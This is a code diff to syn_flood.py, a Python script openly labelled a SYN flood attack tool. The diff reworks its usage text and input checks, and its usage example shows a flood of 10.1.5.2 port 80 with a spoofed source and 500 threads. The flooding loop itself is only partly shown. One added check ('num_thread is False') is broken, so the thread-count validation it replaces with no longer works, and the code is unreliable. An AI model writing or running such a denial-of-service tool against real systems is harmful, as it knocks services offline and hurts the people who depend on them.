@@ -9,9 +9,9 @@ import ipaddress
 
 
 def usage_header():
-    print("SYN FLOOD attack script")
+    print("\t\tSYN Flood attack script")
     print("")
-    print("Usage: ./syn_flood.py ")
+    print("\tUsage: ./syn_flood.py ")
 
 
 def usage_body():
@@ -24,7 +24,7 @@ def usage_body():
 
 
 def usage_example():
-    print("Example: ./syn_flood.py -t 500 -d 10.1.5.2 -p 80 -s 10.1.2.2")
+    print("\tExample: ./syn_flood.py -t 500 -d 10.1.5.2 -p 80 -s 10.1.2.2")
 
 
 def usage():
@@ -70,23 +70,36 @@ def check_param(destination_ip, port, source_ip, num_thread):
     uid = os.getuid()
     if uid == 0:
         print("[*] Permissions look good.")
-        time.sleep(0.5)
+        # time.sleep(0.5)
     else:
         print('[-] Not enough permissions to run this script. Try with sudo...')
-        return -2
+        return -1
 
     ############### Check IPs ###############
     try:  # Check the destination address
         ipaddress.ip_address(destination_ip)
     except:
         print("Wrong destination address")
-        return -1
+        return -2
 
     try:  # Check the source address
         ipaddress.ip_address(source_ip)
     except:
         print("Wrong source address")
-        return -1
+        return -2
+
+    ############### Check Port and Thread ###############
+    if isinstance(port, str):
+        if port.isnumeric() is False:
+            print("Wrong port")
+            return -3
+
+    if isinstance(num_thread, str):
+        if num_thread is False:
+            print("Wrong number of threads")
+            return -3
+
+    return 0
 
 
 def run_atk(destination_ip, port, source_ip, num_thread):
@@ -98,9 +111,13 @@ def run_atk(destination_ip, port, source_ip, num_thread):
     :param num_thread:
     :return:
     """
-    check_param(destination_ip, port, source_ip, num_thread)
+    err_check = check_param(destination_ip, port, source_ip, num_thread)
+    if err_check < 0:
+        usage()
+        return -1
 
-    target_port = port
+    port = int(port)
+    num_thread = int(num_thread)
 
     print('[*] Started SYN Flood on: {}'.format(destination_ip))
     while True:
@@ -124,12 +141,12 @@ def main():
 
     args = parser.parse_args()
 
-    # Check length of input parameters and that the thread amount is a number
-    if not len(sys.argv[1:]) or args.threads.isdigit() is False:
+    # Check length of input parameters
+    if not len(sys.argv[1:]):
         usage()
         return -1
 
-    run_atk(args.destination, int(args.port), args.source, int(args.threads))
+    run_atk(args.destination, args.port, args.source, args.threads)
 
 
 if __name__ == "__main__":
